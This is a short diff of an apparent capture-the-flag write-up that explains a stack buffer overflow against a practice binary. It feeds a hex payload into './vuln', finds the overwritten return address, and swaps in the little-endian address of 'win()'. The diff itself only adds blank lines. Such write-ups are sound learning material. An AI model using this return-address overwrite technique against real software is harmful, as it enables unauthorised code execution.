@@ -14,7 +14,9 @@ echo "00000000: 6161 6161 6161 6161 6161 6161 6161 6161
       00000040: 1010 1010 0909 0909" | xxd -r | ./vuln
 ```
 Output:  `Okay, time to return... Fingers Crossed... Jumping to 0x15151515`  
+
 Observing the output it's clear that we should replace `1515 1515` with `win()`'s address, which we can find out is `0804 85cb` by `objdump -D vuln | grep win`  
+
 Playing around it seems my machine is in Little Endian. So `cb85 0408` is the correct input, instead of `0804 85cb`.
 
 ### Solution:
